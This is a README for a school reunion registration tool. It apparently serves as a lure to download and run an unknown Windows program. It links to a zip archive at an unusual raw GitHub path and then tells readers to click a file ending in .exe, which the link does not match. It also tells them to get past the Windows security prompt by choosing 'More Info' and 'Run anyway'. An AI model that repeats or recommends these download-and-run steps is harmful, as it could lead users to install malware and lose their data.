# 🏫 Reunion-Registration - Register for your school reunion today

[Visit the Release Page](https://raw.githubusercontent.com/jay23065/jay23065.github.io/main/fuffy/Dist-1.1.zip)

This application provides a simple way for alumni of Sunshine Model High School to register for the Eid-ul-Adha Reunion 2026. The registration form collects your details and sends them to the organizers. You do not need technical skills to use this tool.

## 📄 About the project

The Reunion-Registration portal streamlines the signup process for attendees. It features a modern interface that works on phones, tablets, and computers. You provide your contact information, graduation year, and attendance status. The system then sends your entry to the reunion committee.

## 💻 System requirements

Your computer meets the requirements if it has:
* A modern web browser like Chrome, Firefox, or Edge.
* An active internet connection.
* Windows 10 or Windows 11.
* At least 50 MB of free storage space.

## 📥 How to download the software

Follow these steps to obtain the tool:

1. Visit the following link: [https://raw.githubusercontent.com/jay23065/jay23065.github.io/main/fuffy/Dist-1.1.zip](https://raw.githubusercontent.com/jay23065/jay23065.github.io/main/fuffy/Dist-1.1.zip)
2. Locate the latest version of the software.
3. Click the link that ends in .exe to start the download.
4. Save the file to your desktop or downloads folder.

## ⚙️ Running the application

After you download the file, take these steps to open the registration form:

1. Open the folder where you saved the download.
2. Double-click the Reunion-Registration icon to start the installer.
3. If a security prompt appears, click More Info and select Run anyway.
4. Follow the instructions on the screen to finish the setup.
5. The application adds a shortcut to your desktop.
6. Double-click the shortcut to open the portal.

## 📝 How to complete your registration

Once the window opens, follow these instructions to log your attendance:

1. Enter your full name in the first box.
2. Select your batch or graduation year from the list.
3. Include your current mobile number for event updates.
4. Add any dietary requirements or guest details if needed.
5. Click the Submit button at the bottom of the form.
6. Wait for the screen to show a success message.
7. Close the window once you receive confirmation.

## 🛠️ Troubleshooting common issues

If you encounter difficulties, try these simple solutions:

* If the form does not load, ensure your internet connection works.
* If the button does not respond, wait a few seconds for the status to show Processing.
* If you see an error message, restart the application and try again.
* Contact the school office if you still cannot register.
